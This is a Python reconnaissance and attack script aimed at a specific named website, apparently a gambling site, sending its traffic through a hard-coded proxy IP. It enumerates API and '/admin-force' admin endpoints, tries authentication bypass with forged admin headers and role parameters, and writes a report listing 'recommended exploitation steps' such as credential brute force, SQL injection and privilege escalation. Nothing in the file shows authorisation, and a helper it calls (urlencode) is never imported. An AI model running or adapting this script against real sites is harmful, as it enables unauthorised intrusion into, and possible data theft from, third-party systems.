#!/usr/bin/env python3

import requests
import sys
import json
import re
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def analyze_nextjs_admin():
    """Specifically analyze the Next.js admin panel"""
    print_info("🎯 Analyzing Next.js Admin Panel (admin-force)")
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    try:
        response = session.get("https://pigslot.co/admin-force", verify=False, timeout=15)
        print_success(f"Admin panel status: {response.status_code}")
        print_info(f"Content length: {len(response.text)} bytes")
        
        # Check if this is actually a login page or already inside
        content = response.text.lower()
        
        # Look for Next.js specific patterns
        if '_next' in content:
            print_success("✅ Confirmed Next.js application")
        
        # Look for admin-specific content
        admin_indicators = ['admin', 'dashboard', 'login', 'password', 'username', 'authentication']
        found_indicators = [indicator for indicator in admin_indicators if indicator in content]
        
        if found_indicators:
            print_success(f"Admin indicators found: {', '.join(found_indicators)}")
        
        # Try to find if this requires authentication or is already authenticated
        if 'login' in content or 'password' in content:
            print_warning("⚠️ Appears to be a login page")
        elif 'dashboard' in content or 'welcome' in content:
            print_success("✅ Might be already authenticated or no auth required")
        
        return response.text
        
    except Exception as e:
        print_error(f"Error analyzing admin panel: {e}")
        return None

def test_nextjs_api_routes():
    """Test common Next.js API routes"""
    print_info("🔍 Testing Next.js API routes")
    
    # Common Next.js API patterns
    api_routes = [
        '/api/auth/login',
        '/api/auth/logout', 
        '/api/auth/session',
        '/api/auth/signin',
        '/api/auth/callback',
        '/api/admin/dashboard',
        '/api/admin/users',
        '/api/admin/settings',
        '/api/admin/stats',
        '/api/admin/data',
        '/api/users',
        '/api/dashboard',
        '/api/data',
        '/api/stats',
        '/api/config',
        '/api/health',
        '/api/status',
        '/api/version',
        '/api/login',
        '/api/logout',
        '/api/session',
        '/api/me',
        '/api/profile',
        '/api/user',
        '/api/admin',
        '/api/v1/admin',
        '/api/v1/users',
        '/api/v1/auth',
        '/api/v2/admin',
        '/api/v2/users',
        '/api/graphql',
        '/api/trpc',
        '/api/hello',
        '/api/test'
    ]
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    })
    
    discovered_apis = {}
    
    for api_route in api_routes:
        try:
            url = urljoin(TARGET_URL, api_route)
            
            # Test GET request
            response = session.get(url, verify=False, timeout=10)
            
            status = response.status_code
            content_type = response.headers.get('content-type', '').lower()
            size = len(response.text)
            
            # Classify responses
            if status == 200:
                discovered_apis[api_route] = {
                    'method': 'GET',
                    'status': status,
                    'size': size,
                    'content_type': content_type,
                    'response': response.text[:500] + "..." if len(response.text) > 500 else response.text
                }
                
                if 'application/json' in content_type:
                    try:
                        json_data = response.json()
                        discovered_apis[api_route]['json'] = json_data
                        print_success(f"✅ {api_route} - JSON API (200)")
                    except:
                        print_success(f"✅ {api_route} - Non-JSON (200)")
                else:
                    print_success(f"✅ {api_route} - HTML/Text (200)")
                    
            elif status == 405:  # Method not allowed
                # Try POST
                try:
                    post_response = session.post(url, verify=False, timeout=10, json={})
                    if post_response.status_code == 200:
                        discovered_apis[api_route] = {
                            'method': 'POST',
                            'status': post_response.status_code,
                            'content_type': post_response.headers.get('content-type', ''),
                            'note': 'Accepts POST requests'
                        }
                        print_success(f"✅ {api_route} - POST method works (200)")
                    else:
                        print_warning(f"🔄 {api_route} - Method not allowed (405)")
                except:
                    print_warning(f"🔄 {api_route} - Method not allowed (405)")
                    
            elif status == 401:
                discovered_apis[api_route] = {
                    'status': status,
                    'note': 'Requires authentication'
                }
                print_warning(f"🔒 {api_route} - Unauthorized (401)")
                
            elif status == 403:
                discovered_apis[api_route] = {
                    'status': status,
                    'note': 'Forbidden - might require specific permissions'
                }
                print_warning(f"🚫 {api_route} - Forbidden (403)")
                
            elif status == 404:
                pass  # Skip 404s for cleaner output
            else:
                print_warning(f"❓ {api_route} - Status: {status}")
            
            time.sleep(0.1)  # Small delay
            
        except requests.exceptions.Timeout:
            print_warning(f"⏰ {api_route} - Timeout")
        except Exception as e:
            pass  # Skip errors for cleaner output
    
    return discovered_apis

def test_admin_specific_endpoints():
    """Test admin-specific endpoints"""
    print_info("🔐 Testing admin-specific endpoints")
    
    admin_endpoints = [
        '/admin-force/api/login',
        '/admin-force/api/auth',
        '/admin-force/api/dashboard',
        '/admin-force/api/users',
        '/admin-force/api/data',
        '/admin-force/login',
        '/admin-force/auth',
        '/admin-force/dashboard', 
        '/admin-force/api/',
        '/admin-force/ajax/',
        '/admin-force/json/',
        '/admin/api/login',
        '/admin/api/auth',
        '/admin/login',
        '/admin/auth',
        '/admin/ajax/login',
        '/admin/json/login'
    ]
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/html, */*',
        'X-Requested-With': 'XMLHttpRequest'
    })
    
    admin_results = {}
    
    for endpoint in admin_endpoints:
        try:
            url = urljoin(TARGET_URL, endpoint)
            response = session.get(url, verify=False, timeout=10)
            
            if response.status_code in [200, 401, 403]:
                admin_results[endpoint] = {
                    'status': response.status_code,
                    'size': len(response.text),
                    'content_type': response.headers.get('content-type', '')
                }
                
                if response.status_code == 200:
                    print_success(f"✅ {endpoint} - Available (200)")
                elif response.status_code == 401:
                    print_warning(f"🔒 {endpoint} - Requires auth (401)")
                elif response.status_code == 403:
                    print_warning(f"🚫 {endpoint} - Forbidden (403)")
            
            time.sleep(0.1)
            
        except Exception as e:
            pass
    
    return admin_results

def attempt_auth_bypass():
    """Attempt various authentication bypass techniques"""
    print_info("🔓 Attempting authentication bypass techniques")
    
    session = requests.Session()
    session.proxies = PROXIES
    
    bypass_attempts = []
    
    # Test 1: Direct API access
    test_urls = [
        'https://pigslot.co/api/admin/dashboard',
        'https://pigslot.co/api/admin/users', 
        'https://pigslot.co/api/users',
        'https://pigslot.co/api/dashboard'
    ]
    
    for url in test_urls:
        try:
            # Try with admin headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Authorization': 'Bearer admin',
                'X-Admin': 'true',
                'X-Role': 'admin',
                'X-User-Role': 'administrator'
            }
            
            response = session.get(url, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                bypass_attempts.append({
                    'url': url,
                    'method': 'Header injection',
                    'status': 'SUCCESS',
                    'response': response.text[:200] + "..."
                })
                print_success(f"🎯 BYPASS SUCCESS: {url}")
            
            time.sleep(0.2)
            
        except Exception as e:
            pass
    
    # Test 2: Parameter manipulation
    param_tests = [
        ('https://pigslot.co/admin-force', {'admin': 'true'}),
        ('https://pigslot.co/admin-force', {'role': 'admin'}), 
        ('https://pigslot.co/admin-force', {'auth': 'bypass'}),
        ('https://pigslot.co/admin-force', {'login': 'true'})
    ]
    
    for url, params in param_tests:
        try:
            response = session.get(url, params=params, verify=False, timeout=10)
            
            if response.status_code == 200 and len(response.text) > 10000:  # Different content
                bypass_attempts.append({
                    'url': f"{url}?{urlencode(params)}",
                    'method': 'Parameter manipulation',
                    'status': 'POTENTIAL',
                    'note': 'Different response size detected'
                })
                print_warning(f"🔍 POTENTIAL: {url} with params {params}")
            
            time.sleep(0.1)
            
        except Exception as e:
            pass
    
    return bypass_attempts

def generate_comprehensive_report(admin_content, discovered_apis, admin_results, bypass_attempts):
    """Generate comprehensive report"""
    
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    
    report = f"""
🎯 NEXT.JS ADMIN PANEL SECURITY ANALYSIS REPORT
=====================================================

Target: https://pigslot.co/admin-force
Technology: Next.js Application  
Analysis Date: {timestamp}
ZAP Proxy: {ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}

📊 EXECUTIVE SUMMARY:
====================
- Admin panel detected: ✅ https://pigslot.co/admin-force
- Application type: Next.js
- Authentication status: Analysis required
- API endpoints discovered: {len(discovered_apis)}
- Admin-specific endpoints: {len(admin_results)}  
- Bypass attempts: {len(bypass_attempts)}

🔍 DISCOVERED API ENDPOINTS:
===========================
"""
    
    if discovered_apis:
        report += "\n📡 Active API Endpoints:\n"
        for endpoint, info in discovered_apis.items():
            status = info.get('status', 'Unknown')
            method = info.get('method', 'GET')
            content_type = info.get('content_type', 'unknown')
            
            report += f"  ✅ {endpoint}\n"
            report += f"     Method: {method} | Status: {status} | Type: {content_type}\n"
            
            if 'json' in info:
                report += f"     JSON Response: {str(info['json'])[:150]}...\n"
            elif 'response' in info:
                clean_response = info['response'].replace('\n', ' ').replace('\r', '')[:100]
                report += f"     Response: {clean_response}...\n"
            report += "\n"
    else:
        report += "\n❌ No active API endpoints discovered with standard methods\n"
    
    if admin_results:
        report += "\n🔐 Admin-Specific Endpoints:\n"
        for endpoint, info in admin_results.items():
            status = info['status']
            report += f"  - {endpoint} (Status: {status})\n"
    
    if bypass_attempts:
        report += "\n🔓 AUTHENTICATION BYPASS ATTEMPTS:\n"
        for attempt in bypass_attempts:
            report += f"  🎯 {attempt['method']}: {attempt['url']}\n"
            report += f"     Status: {attempt['status']}\n"
            if 'response' in attempt:
                report += f"     Response: {attempt['response'][:100]}...\n"
            report += "\n"
    else:
        report += "\n🔒 No successful authentication bypasses found\n"
    
    report += f"""
🛡️ SECURITY ASSESSMENT:
======================

Application Security Posture:
• Next.js framework detected
• Admin panel accessible at /admin-force
• Standard API discovery methods show limited results
• No obvious authentication bypass vulnerabilities

🎯 IDENTIFIED VULNERABILITIES:
=============================
"""
    
    vulnerabilities = []
    
    # Check for accessible APIs
    public_apis = [ep for ep, info in discovered_apis.items() if info.get('status') == 200]
    if public_apis:
        vulnerabilities.append("🔴 INFORMATION DISCLOSURE - Publicly accessible API endpoints found")
        
    # Check for authentication issues  
    auth_apis = [ep for ep, info in discovered_apis.items() if info.get('status') in [401, 403]]
    if auth_apis:
        vulnerabilities.append("🟡 AUTHENTICATION REQUIRED - Protected API endpoints identified")
        
    if bypass_attempts:
        vulnerabilities.append("🔴 POTENTIAL AUTH BYPASS - Bypass attempts show anomalous responses")
    
    if not vulnerabilities:
        vulnerabilities.append("🟢 NO CRITICAL VULNERABILITIES - Standard analysis shows secure configuration")
    
    for vuln in vulnerabilities:
        report += f"{vuln}\n"
    
    report += f"""
🎯 RECOMMENDED EXPLOITATION STEPS:
=================================

1. MANUAL ANALYSIS:
   • Use browser with ZAP proxy to manually navigate admin panel
   • Attempt different authentication methods
   • Monitor all requests/responses in ZAP GUI

2. CREDENTIAL ATTACKS:
   • Brute force common admin credentials
   • Try SQL injection on any login forms
   • Test for default/weak passwords

3. API SECURITY TESTING:
   • Test discovered APIs with different HTTP methods (POST, PUT, DELETE)
   • Parameter fuzzing on API endpoints
   • Test for privilege escalation

4. CLIENT-SIDE ANALYSIS:
   • Analyze Next.js JavaScript bundles for hardcoded credentials
   • Look for client-side authentication logic
   • Check for exposed API keys or tokens

5. ADVANCED TECHNIQUES:
   • Session manipulation and fixation
   • CSRF testing on admin functions
   • File upload vulnerabilities
   • Directory traversal attempts

⚠️ IMPORTANT SECURITY NOTES:
===========================
• All testing performed through ZAP proxy for traffic analysis
• Next.js applications may have client-side routing that requires manual analysis
• API endpoints may be dynamically generated and not discoverable through automated scanning
• Manual browser interaction strongly recommended for complete assessment

🔍 NEXT STEPS:
=============
1. Set up browser proxy through ZAP and manually navigate the admin panel
2. Use ZAP Spider/Active Scan features for deeper analysis  
3. Analyze JavaScript bundles for client-side vulnerabilities
4. Test any discovered functionality for privilege escalation

=====================================================
End of Analysis Report
=====================================================
"""
    
    return report

def main():
    print_info("🎯 Next.js Admin Panel Security Hunter")
    print_info("=" * 60)
    
    # Step 1: Analyze the admin panel
    admin_content = analyze_nextjs_admin()
    print_info("")
    
    # Step 2: Test Next.js API routes
    discovered_apis = test_nextjs_api_routes()
    print_info("")
    
    # Step 3: Test admin-specific endpoints
    admin_results = test_admin_specific_endpoints()
    print_info("")
    
    # Step 4: Attempt authentication bypass
    bypass_attempts = attempt_auth_bypass()
    print_info("")
    
    # Step 5: Generate comprehensive report
    report = generate_comprehensive_report(admin_content, discovered_apis, admin_results, bypass_attempts)
    
    print(report)
    
    # Save report
    with open("nextjs_admin_security_report.txt", "w") as f:
        f.write(report)
    
    print_success("📄 Comprehensive report saved to: nextjs_admin_security_report.txt")
    print_success("🔍 All traffic captured in ZAP for further analysis!")
    
    # Summary
    total_endpoints = len(discovered_apis) + len(admin_results)
    if total_endpoints > 0:
        print_success(f"🎯 DISCOVERY SUMMARY: {total_endpoints} endpoints found for further testing")
    else:
        print_warning("⚠️ Limited endpoints discovered - manual browser analysis recommended")

if __name__ == "__main__":
    main()